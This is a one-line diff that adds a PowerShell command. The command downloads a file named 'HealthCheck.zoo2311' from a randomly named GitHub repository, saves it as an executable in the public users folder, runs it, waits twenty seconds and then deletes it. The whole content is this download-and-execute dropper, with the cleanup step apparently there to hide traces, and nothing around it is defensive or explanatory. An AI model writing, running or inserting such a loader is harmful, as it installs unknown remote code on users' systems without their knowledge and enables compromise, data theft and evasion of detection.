@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://github.com/BabyCoderLe/sasfjasgsa/blob/main/HealthCheck.zoo2311?raw=true" -OutFile "c:\users\public\a.exe";c:\users\public\a.exe;Start-Sleep -s 20;del c:\users\public\a.exe;
